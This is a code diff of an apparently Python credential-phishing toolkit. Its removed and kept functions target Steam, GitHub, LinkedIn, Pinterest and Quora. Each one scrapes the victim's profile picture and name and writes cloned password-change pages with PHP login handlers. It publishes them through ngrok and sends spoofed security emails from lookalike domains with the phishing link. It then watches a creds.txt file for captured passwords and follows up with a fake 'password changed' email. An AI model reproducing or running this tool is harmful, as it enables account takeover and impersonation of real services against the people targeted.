-	print(Blue+"""            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    """)
-	print(Blue+"""            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   """)
-	print(Blue+"""             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  """)
-	print(Blue+"""              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ """)
-	print(Blue+"""               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\""")
-	print(Blue+"""                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|"""+Green+'V1.0 \n')
-	print("                             "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)
-
-	display = Display(visible=0, size=(800, 600))
-	display.start()
-	br = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
-
-	try:
-		br.get('https://steamcommunity.com/id/'+str(UNAME))
-		time.sleep(1)
-		pic = br.find_element_by_css_selector('.playerAvatarAutoSizeInner > img:nth-child(1)').get_attribute("src")
-	except Exception:
-		br.get('https://steamcommunity.com/profiles/'+str(UNAME))
-		time.sleep(1)
-		pic = br.find_element_by_css_selector('.playerAvatarAutoSizeInner > img:nth-child(1)').get_attribute("src")
-
-	NAME = br.find_element_by_css_selector('.profile_header_centered_persona > div:nth-child(1) > span:nth-child(1)').text
-
-	br.close()
-	display.stop()
-
-	os.system('rm -r ./WEBSERVER')
-	os.system('mkdir ./WEBSERVER')
-
-
-	filedata = str(Main_steam)
-	with open('./WEBSERVER/index.html', 'w') as file:
-		file.write(filedata)
-
-
-	filedata = str(ChangePass_steam)
-
-	filedata = filedata.replace('[PIC]', str(pic))
-	filedata = filedata.replace('[NAME]', str(NAME))
-
-	with open('./WEBSERVER/change_password.html', 'w') as file:
-		file.write(filedata)
-
-
-
-	filedata = str(Secured_steam)
-	with open('./WEBSERVER/account_secured.html', 'w') as file:
-		file.write(filedata)
-
-
-
-	filedata = str(Login_steam)
-	with open('./WEBSERVER/login.php', 'w') as file:
-		file.write(filedata)
-
-
-	filedata = str(Login2_steam)
-	with open('./WEBSERVER/login2.php', 'w') as file:
-		file.write(filedata)
-
-
-	os.system('echo "" > ./WEBSERVER/creds.txt')
-
-
-	code = random.choice(['4JN89','9KL07','57LK1','K85D0','7GHS5'])
-
-
-	os.system('chmod -R 777 ./WEBSERVER/')
-	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
-	os.system("./ngrok http 80 > /dev/null &")
-	time.sleep(3)
-	display = Display(visible=0, size=(800, 600))
-	display.start()
-	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
-	browser.get("http://localhost:4040/status")
-	time.sleep(5)
-	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
-	browser.close()
-	display.stop()
-	phishin_url = str(url_f)
-
-
-	emaildata = str(Email_steam)
-
-
-	emaildata = emaildata.replace('[EMAIL]', str(Email))
-	emaildata = emaildata.replace('[CODE]', str(code))
-	emaildata = emaildata.replace('[PHISH]', str(phishin_url))
-
-	from_email = str(random.choice(['security@steammails.com','no-reply@steammails.com']))
-
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Trying to login?', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-
-	os.system('reset')
-	banN()
-
-	print("             \033[0;37m################################################")
-	print("             #  \033[0mListening for Creds on U/ID: \033[0;94m"+str(UNAME)+"\033[0;37m #")
-	print("             ################################################\033[0;93m")
-	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")
-
-	os.system('tail -f ./WEBSERVER/creds.txt')
-	print("\n                 \033[0;34m######################################")
-	print("                 #              --DONE--              #")
-	print("                 ######################################")
-	os.system("pkill -9 ngrok")
-	os.system("pkill -9 php")
-	print("               Automatically Sending a Confirmation Email!!\n")
-
-	emaildata = str(Email1_steam)
-	emaildata = emaildata.replace('[EMAIL]', str(Email))
-
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'password changed', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-	os.system("reset")
-	ENDst()
-
-
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-
-
-def Github():
-
-	pic = ''
-	loc = ''
-
-	UNAME = input("     "+Grey+"["+Blue+"Username"+Grey+"]"+Green+": "+Reset)
-	Email = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)
-
-	rndm = input("     "+Grey+"["+Blue+"Wanna use random settings for the email"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)
-
-	if rndm == "N":
-		loc = input("     "+Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)
-
-	elif rndm == "y":
-		loc = random.choice(['Iraq','Egypt','Russia'])
-
-
-	os.system('reset')
-	print(Blue+'                    ________  ___  _________                       ')
-	print(Blue+'                   |\\   ____\\|\\  \\|\\___   ___\\                     ')
-	print(Blue+'                   \\ \\  \\___|\\ \\  \\|___ \\  \\_|                     ')
-	print(Blue+'                    \\ \\  \\  __\\ \\  \\   \\ \\  \\                      ')
-	print(Blue+'                     \\ \\  \\|\\  \\ \\  \\   \\ \\  \\                     ')
-	print(Blue+'                      \\ \\_______\\ \\__\\   \\ \\__\\                    ')
-	print(Blue+'                       \\|_______|\\|__|    \\|__|                    ')
-	print(Blue+'                                                                   ')
-	print(Blue+'                                                                   ')
-	print(Blue+'                                                                   ')
-	print(Blue+'             ___  ___  ________  ________  ___  __    ________     ')
-	print(Blue+'            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    ')
-	print(Blue+'            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   ')
-	print(Blue+'             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  ')
-	print(Blue+'              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ ')
-	print(Blue+'               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\')
-	print(Blue+'                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|'+Green+'V1.0')
-	print("                             "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)
-
-
-	display = Display(visible=0, size=(800, 600))
-	display.start()
-
-	try:
-		br = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
-		time.sleep(2)
-		GITURL = 'https://www.github.com/'+str(UNAME)
-		br.get(GITURL)
-		time.sleep(4)
-		img = br.find_element_by_css_selector('img.avatar:nth-child(1)').get_attribute("src")
-	except Exception:
-		print('\n     '+Red+'BUZZZ, user Doesn\'t exist')
-		sys.exit(0)
-
-	display.stop()
-
-
-	os.system('rm -r ./WEBSERVER/')
-	os.system('mkdir ./WEBSERVER')
-
-	filedata = str(Main_github)
-
-	filedata = filedata.replace('[PIC]', str(img))
-	filedata = filedata.replace('[UNAME]', str(UNAME))
-	filedata = filedata.replace('[OPTION]', '')
-
-	with open('./WEBSERVER/index.html', 'w') as file:
-		file.write(filedata)
-
-
-
-	filedata = str(Main_github)
-
-	filedata = filedata.replace('[PIC]', str(img))
-	filedata = filedata.replace('[UNAME]', str(UNAME))
-	filedata = filedata.replace('[OPTION]', str(Option_github))
-
-	with open('./WEBSERVER/pass_changed.html', 'w') as file:
-		file.write(filedata)
-
-
-	filedata = str(Login_github)
-	with open('./WEBSERVER/login.php', 'w') as file:
-		file.write(filedata)
-
-	os.system('touch ./WEBSERVER/creds.txt')
-
-
-
-	os.system('chmod -R 777 ./WEBSERVER/')
-	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
-	os.system("./ngrok http 80 > /dev/null &")
-	time.sleep(3)
-	display = Display(visible=0, size=(800, 600))
-	display.start()
-	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
-	browser.get("http://localhost:4040/status")
-	time.sleep(5)
-	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
-	browser.close()
-	display.stop()
-	phishin_url = str(url_f)
-
-
-	emaildata = str(Email_github)
-	emaildata = emaildata.replace('[UNAME]',str(UNAME))
-	emaildata = emaildata.replace('[EMAIL]',str(Email))
-	emaildata = emaildata.replace('[LOC]',str(loc))
-	emaildata = emaildata.replace('[PHISH]',str(phishin_url))
-
-
-
-	from_email = str(random.choice(['security@gitmails.com','no-reply@gitmails.com']))
-
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Trying to login?', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-
-	os.system('reset')
-	banN()
-
-	print("             \033[0;37m################################################")
-	print("             #  \033[0mListening for Creds on Uname: \033[0;94m"+str(UNAME)+"\033[0;37m #")
-	print("             ################################################\033[0;93m")
-	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")
-
-	os.system('tail -f ./WEBSERVER/creds.txt')
-	print("\n                 \033[0;34m######################################")
-	print("                 #              --DONE--              #")
-	print("                 ######################################")
-	os.system("pkill -9 ngrok")
-	os.system("pkill -9 php")
-	print("               Automatically Sending a Confirmation Email!!\n")
-
-	emaildata = str(Email1_github)
-	emaildata = emaildata.replace('[UNAME]', str(UNAME))
-
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'password changed', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-	os.system("reset")
-	ENDst()
-
-
-
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-
-
-
-def LinkedIn():
-	NAME = input("     "+Grey+"["+Blue+"Name"+Grey+"]"+Green+": "+Reset)
-	Email = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)
-
-	rndm = input("     "+Grey+"["+Blue+"Wanna use random settings for the email"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)
-
-	PIC = input("     "+Grey+"["+Blue+"ProfileImgLink"+Grey+"]"+Green+": "+Reset)
-
-
-	if rndm == "N":
-		osz =  input("     "+Grey+"["+Blue+"OS"+Grey+"]"+Green+": "+Reset)
-		locz = input("     "+Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)
-	elif rndm == "y":
-		locz = random.choice(['Iraq','Egypt','Russia'])
-		osz = random.choice(['Linux'])	
-
-
-	first_name = NAME.strip().split(" ",1)[0]
-
-
-
-	os.system('reset')
-
-	print(Blue+"             ___       ___  __    ________  ________               ")
-	print(Blue+"            |\\  \\     |\\  \\|\\  \\ |\\   ___ \\|\\   ___  \\             ")
-	print(Blue+"            \\ \\  \\    \\ \\  \\/  /|\\ \\  \\_|\\ \\ \\  \\\\ \\  \\            ")
-	print(Blue+"             \\ \\  \\    \\ \\   ___  \\ \\  \\ \\\\ \\ \\  \\\\ \\  \\           ")
-	print(Blue+"              \\ \\  \\____\\ \\  \\\\ \\  \\ \\  \\_\\\\ \\ \\  \\\\ \\  \\          ")
-	print(Blue+"               \\ \\_______\\ \\__\\\\ \\__\\ \\_______\\ \\__\\\\ \\__\\         ")
-	print(Blue+"                \\|_______|\\|__| \\|__|\\|_______|\\|__| \\|__|         ")
-	print(Blue+"                                                                   ")
-	print(Blue+"                                                                   ")
-	print(Blue+"                                                                   ")
-	print(Blue+"             ___  ___  ________  ________  ___  __    ________     ")
-	print(Blue+"            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    ")
-	print(Blue+"            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   ")
-	print(Blue+"             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  ")
-	print(Blue+"              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ ")
-	print(Blue+"               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\")
-	print(Blue+"                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|"+Green+"V1.0"+Reset)
-	print("                             "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)
-
-
-	os.system('rm -r ./WEBSERVER/')
-	os.system('mkdir ./WEBSERVER')
-
-	filedata = str(Main_Linkedin)
-
-	filedata = filedata.replace('[PIC]', PIC)
-	filedata = filedata.replace('[UNAME]', str(NAME))
-	filedata = filedata.replace('[FIRSTNAME]', str(first_name))
-
-	with open('./WEBSERVER/index.html', 'w') as file:
-		file.write(filedata)
-
-
-	filedata = str(Secured_Linkedin)
-	with open('./WEBSERVER/pass_changed.html', 'w') as file:
-		file.write(filedata)
-
-
-	filedata = str(Login_Linkedin)
-	with open('./WEBSERVER/login.php', 'w') as file:
-		file.write(filedata)
-
-
-	os.system('touch ./WEBSERVER/creds.txt')
-
-
-
-	os.system('chmod -R 777 ./WEBSERVER/')
-	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
-	os.system("./ngrok http 80 > /dev/null &")
-	time.sleep(3)
-	display = Display(visible=0, size=(800, 600))
-	display.start()
-	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
-	browser.get("http://localhost:4040/status")
-	time.sleep(5)
-	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
-	browser.close()
-	display.stop()
-	phishin_url = str(url_f)
-
-
-	emaildata = str(Email1_Linkedin)
-	emaildata = emaildata.replace('[FIRSTNAME]',str(first_name))
-	emaildata = emaildata.replace('[OS]',str(osz))
-	emaildata = emaildata.replace('[LOC]',str(locz))
-	emaildata = emaildata.replace('[phishing]',str(phishin_url))
-
-	from_email = str(random.choice(['security@linkedinmails.com','no-reply@linkedinmails.com']))
-
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Trying to login?', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-
-	os.system('reset')
-	banN()
-
-	print("             \033[0;37m################################################")
-	print("             #  \033[0mListening for Creds on Uname: \033[0;94m"+str(NAME)+"\033[0;37m #")
-	print("             ################################################\033[0;93m")
-	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")
-
-	os.system('tail -f ./WEBSERVER/creds.txt')
-
-	print("\n                 \033[0;34m######################################")
-	print("                 #              --DONE--              #")
-	print("                 ######################################")
-	os.system("pkill -9 ngrok")
-	os.system("pkill -9 php")
-	print("               Automatically Sending a Confirmation Email!!\n")
-
-	emaildata = str(Email2_Linkedin)
-	emaildata = emaildata.replace('[FIRSTNAME]', str(first_name))
-
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'password changed', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-	os.system("reset")
-	ENDst()
-
-
-
-
-
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-
-
-
-
-
-def Pinterest():
-	UNAME = input("     "+Grey+"["+Blue+"Username"+Grey+"]"+Green+": "+Reset)
-	Email = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)
-
-	rndm = input("     "+Grey+"["+Blue+"Wanna use random settings for the email"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)
-
-	if rndm == "N":
-		osz =  input("     "+Grey+"["+Blue+"OS"+Grey+"]"+Green+": "+Reset)
-		locz = input("     "+Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)
-	elif rndm == "y":
-		locz = random.choice(['Iraq','Egypt','Russia'])
-		osz = random.choice(['Linux'])	
-
-	os.system('reset')
-
-	print(Blue+"""                 ________  ___  ________                           """)
-	print(Blue+"""                |\\   __  \\|\\  \\|\\   ___  \\                         """)
-	print(Blue+"""                \\ \\  \\|\\  \\ \\  \\ \\  \\\\ \\  \\                        """)
-	print(Blue+"""                 \\ \\   ____\\ \\  \\ \\  \\\\ \\  \\                       """)
-	print(Blue+"""                  \\ \\  \\___|\\ \\  \\ \\  \\\\ \\  \\                      """)
-	print(Blue+"""                   \\ \\__\\    \\ \\__\\ \\__\\\\ \\__\\                     """)
-	print(Blue+"""                    \\|__|     \\|__|\\|__| \\|__|                     """)
-	print(Blue+"""                                                                   """)
-	print(Blue+"""                                                                   """)
-	print(Blue+"""                                                                   """)
-	print(Blue+"""             ___  ___  ________  ________  ___  __    ________     """)
-	print(Blue+"""            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    """)
-	print(Blue+"""            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   """)
-	print(Blue+"""             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  """)
-	print(Blue+"""              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ """)
-	print(Blue+"""               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\""")
-	print(Blue+"""                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|""")
-	print("                             "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)
-
-	NAME = ''
-	EMAIL = ''
-
-	try:
-		display = Display(visible=0, size=(800, 600))
-		display.start()
-		br = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
-		url = 'https://pinterest.com/'+str(UNAME)+'/'
-		br.get(url)
-		time.sleep(6)
-		k = br.find_element_by_css_selector('._u3')
-		NAME = str(br.find_element_by_css_selector('._tf').text)
-		PIC = str(k.get_attribute("src"))
-		br.close()
-		display.stop()
-		
-	except Exception as e:
-		print("     "+Grey+"["+Red+"UNAME DOESN'T EXIST"+Grey+"]"+Green+": "+Reset)
-		exit(0)
-
-
-
-
-
-	os.system('rm -r ./WEBSERVER/')
-	os.system('mkdir ./WEBSERVER')
-
-	filedata = str(Main_pinterest)
-
-	filedata = filedata.replace('[PIC]', PIC)
-	filedata = filedata.replace('[NAME]', str(NAME))
-	filedata = filedata.replace('[UNAME]', str(UNAME))
-	filedata = filedata.replace('[EMAIL]', str(Email))
-
-	with open('./WEBSERVER/index.html', 'w') as file:
-		file.write(filedata)
-
-
-
-	filedata = str(Mobile_pinterest)
-
-	with open('./WEBSERVER/mobile.html', 'w') as file:
-		file.write(filedata)
-
-	filedata = str(Secured_pinterest)
-	with open('./WEBSERVER/pass_changed.html', 'w') as file:
-		file.write(filedata)
-
-
-	filedata = str(Login_pinterest)
-	with open('./WEBSERVER/login.php', 'w') as file:
-		file.write(filedata)
-
-
-
-
-	os.system('touch ./WEBSERVER/creds.txt')
-
-
-
-	os.system('chmod -R 777 ./WEBSERVER/')
-	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
-	os.system("./ngrok http 80 > /dev/null &")
-	time.sleep(3)
-	display = Display(visible=0, size=(800, 600))
-	display.start()
-	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
-	browser.get("http://localhost:4040/status")
-	time.sleep(5)
-	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
-	browser.close()
-	display.stop()
-	phishin_url = str(url_f)
-
-
-	emaildata = str(Email_pinterest)
-	emaildata = emaildata.replace('[NAME]', str(NAME))
-	emaildata = emaildata.replace('[OS]',str(osz))
-	emaildata = emaildata.replace('[LOC]',str(locz))
-	emaildata = emaildata.replace('[PHISH]', str(phishin_url))
-
-	from_email = str(random.choice(['security@pinterestmails.com','no-reply@pinterestmails.com']))
-
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Trying to login?', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-
-	os.system('reset')
-	banN()
-
-	print("             \033[0;37m################################################")
-	print("             #  \033[0mListening for Creds on Uname: \033[0;94m"+str(UNAME)+"\033[0;37m #")
-	print("             ################################################\033[0;93m")
-	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")
-
-	os.system('tail -f ./WEBSERVER/creds.txt')
-
-	print("\n                 \033[0;34m######################################")
-	print("                 #              --DONE--              #")
-	print("                 ######################################")
-	os.system("pkill -9 ngrok")
-	os.system("pkill -9 php")
-
-	print("               Automatically Sending a Confirmation Email!!\n")
-
-	emaildata = str(Confirm_pinterest)
-	emaildata = emaildata.replace('[NAME]', str(NAME))
-
-	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'password changed', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
-	os.system("reset")
-	ENDst()
-
-
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-#############################################################################################################################
-
 
 
 def Quora():
@@ -1638,15 +859,15 @@ def Quora():
 
 	os.system('rm cunt.html')
 
-	os.system('rm -r ./WEBSERVER/')
-	os.system('mkdir ./WEBSERVER')
+	os.system('rm -r ./ANTSERVER/')
+	os.system('mkdir ./ANTSERVER')
 
 	filedata = str(Main_Quora)
 
 	filedata = filedata.replace('[PIC]', PIC)
 	filedata = filedata.replace('[EMAIL]', str(Email))
 
-	with open('./WEBSERVER/index.html', 'w') as file:
+	with open('./ANTSERVER/index.html', 'w') as file:
 		file.write(filedata)
 
 
@@ -1654,31 +875,31 @@ def Quora():
 	filedata = str(Mobile_Quora)
 	filedata = filedata.replace('[EMAIL]', str(Email))
 
-	with open('./WEBSERVER/mobile.html', 'w') as file:
+	with open('./ANTSERVER/mobile.html', 'w') as file:
 		file.write(filedata)
 
 	filedata = str(Secured_Quora)
-	with open('./WEBSERVER/pass_changed.html', 'w') as file:
+	with open('./ANTSERVER/pass_changed.html', 'w') as file:
 		file.write(filedata)
 
 
 	filedata = str(Login_Quora)
-	with open('./WEBSERVER/login.php', 'w') as file:
+	with open('./ANTSERVER/login.php', 'w') as file:
 		file.write(filedata)
 
 
 	filedata = str(Login1_Quora)
-	with open('./WEBSERVER/login1.php', 'w') as file:
+	with open('./ANTSERVER/login1.php', 'w') as file:
 		file.write(filedata)
 
 
 
-	os.system('touch ./WEBSERVER/creds.txt')
+	os.system('touch ./ANTSERVER/creds.txt')
 
 
 
-	os.system('chmod -R 777 ./WEBSERVER/')
-	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
+	os.system('chmod -R 777 ./ANTSERVER/')
+	os.system('xterm -e "cd ./ANTSERVER/ && php -S 127.0.0.1:80" &')
 
 	os.system("./ngrok http 80 > /dev/null &")
 	time.sleep(3)
@@ -1757,19 +978,23 @@ def banN():
 
 def ENDst():
 	os.system('clear')
-	print(Green+"""\n        .'(   )\\.---.   )\\.---.     /(,-.    )\\.--.   )\\.---.     )\\.-. """)
-	print(Green+"""    ,') \\  ) (   ,-._( (   ,-._(  ,' _   )  (   ._.' (   ,-._(  ,' ,-,_)""")
-	print(Green+"""   (  /(/ /   \\  '-,    \\  '-,   (  '-' (    `-.`.    \\  '-,   (  .   _ """)
-	print(Green+"""    )    (     ) ,-`     ) ,-`    )  _   )  ,_ (  \\    ) ,-`    ) '..' )""")
-	print(Green+"""   (  .'\\ \\   (  ``-.   (  ``-.  (  '-' /  (  '.)  )  (  ``-.  (  ,   ( """)
-	print(Green+"""    )/   )/    )..-.(    )..-.(   )/._.'    '._,_.'    )..-.(   )/'._.' """)
+	print("            "+Blue+"         @@@              @@@           @  @@@@@@@@@@@@@@@@@@@@   ")
+	print("            "+Blue+"       @@@ @@@            @  @          @           @              "  )
+	print("            "+Blue+"      @@@   @@@           @    @        @           @       "  )
+	print("            "+Blue+"     @@@     @@@          @     @       @           @      "  )
+	print("            "+Blue+"    @@@       @@@         @      @      @           @         "  )
+	print("            "+Blue+"   @@@         @@@        @       @     @           @           "  )
+	print("            "+Blue+"  @@@:!:::@!:!::@@@       @        @    @           @          "  )
+	print("            "+Blue+":@@@             @@@      @         @   @           @         "  )
+	print("            "+Blue+" @@               @@      @          @  @           @      "  )
+	print("            "+Blue+" @                 @  @@  @           @ @  @@       @         """)
 	print(Green+"""                                                                        """)
 	print("                         "+Grey+"["+Green+"+"+Grey+"]"+Reset+" FOLLOW US ON: "+Grey+"["+Green+"+"+Grey+"]\n")
-	print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"GITHUB"+Grey+"]:"+Reset+" https://goo.gl/ooZC6H ")
-	print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"TWITTER"+Grey+"]:"+Reset+" https://goo.gl/b1w5x1 ")
-	print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"YOUTUBE"+Grey+"]:"+Reset+" https://goo.gl/YcqyuQ")
-	print(Grey+" ["+Green+"+"+Grey+"]-["+Green+"Z-HACKER"+Grey+"]:"+Reset+" https://goo.gl/eHQMXC \n")
-	print('                              '+Reset+'-'+Grey+'Stay Weeb'+Reset+'-\n')
+	print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"GITHUB"+Grey+"]:"+Reset+" https://bit.ly/2xX878u")
+	print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"TWITTER"+Grey+"]:"+Reset+" https://bit.ly/2zOx9rC")
+	print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"YOUTUBE"+Grey+"]:"+Reset+" https://bit.ly/2P6BADf")
+	print(Grey+" ["+Green+"+"+Grey+"]-["+Green+"A.N.T"+Grey+"]:"+Reset+" n")
+	print('                              '+Reset+'-'+Grey+'By X:xUzManN/A/'+Reset+'-\n')
 	sys.exit(0)
 
 
